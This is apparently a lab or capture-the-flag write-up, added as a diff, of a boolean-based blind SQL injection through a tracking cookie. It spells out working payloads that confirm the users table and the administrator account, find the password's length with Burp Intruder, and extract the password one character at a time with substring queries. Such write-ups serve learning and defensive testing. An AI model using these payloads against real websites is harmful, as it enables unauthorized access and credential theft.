@@ -1,0 +1,42 @@
+Perform a Blind SQLi on the cookie parameter
+
+End Goal:
+- Enumerate the admin password
+- Log in as Admin
+
+Analysis
+
+STEP1:
+When entering a cookie, the client send a query like this:
+- SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
+- if the query return a value it will send a Welcome Back message
+
+ Using this return value we can ask the server if the query is valid
+by adding a logical statement we can define is the adding part is TRUE or FALSE
+
+- SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'' and 1=1--'
+payload : 0EWBBRnGu1vXZr0H'and 1=1--'
+output: TRUE -> Welcome Back!
+
+2nd payload: TrackingId=0EWBBRnGu1vXZr0H'and 1=0--'
+output: False -> No welcome back
+
+STEP2: Enumerate the users
+instead of simple put 1 we can add subquery:
+- SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'' and (select 'x' from users LIMIT 1)="x"--'
+payload : TrackingId=vvSKWzE0wRNVzox1'and (select 'x' from users LIMIT 1)='x'--'
+output: True -> Welcome Back message
+
+Now we can confirm if the administrator user exist in the DB
+payload: TrackingId=vvSKWzE0wRNVzox1'and (select username from users where username='administrator')='administrator'--'
+output: True -> Welcome Back message
+
+STEP3: Determining the password
+payload: TrackingId=vvSKWzE0wRNVzox1'and (select username from users where username='administrator' and LENGTH (password)>1)='administrator'--'
+using burp suite intruder to perform a sniper attack.
+output: When the password >20 = False so the length of the password is exactly 20 caracters
+
+
+Payload for the 1 letter: TrackingId=vvSKWzE0wRNVzox1'and (select substring(password,1,1) from users where username='administrator')='a'--'
+Payload for the 2 letter: TrackingId=vvSKWzE0wRNVzox1'and (select substring(password,2,1) from users where username='administrator')='a'--'
+so on..
